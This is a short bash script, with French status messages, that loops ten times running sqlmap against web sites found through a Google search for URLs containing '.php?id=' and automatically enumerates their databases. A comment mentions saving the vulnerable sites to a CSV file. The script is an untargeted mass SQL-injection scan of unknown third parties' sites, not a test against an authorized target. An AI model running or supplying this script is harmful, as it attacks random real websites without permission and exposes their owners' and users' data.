#! /bin/bash
#
echo LANCEMENT DU SCRIPT
cd /root/sqlmap 

for i in `seq 1 10` ;
do
	python3 sqlmap.py -g inurl:".php?id="$i"" --dbs --batch
	//Here we allow the backup of the positive websites to a .csv
	echo PAUSE INTRABOUCLE
	sleep 15
done
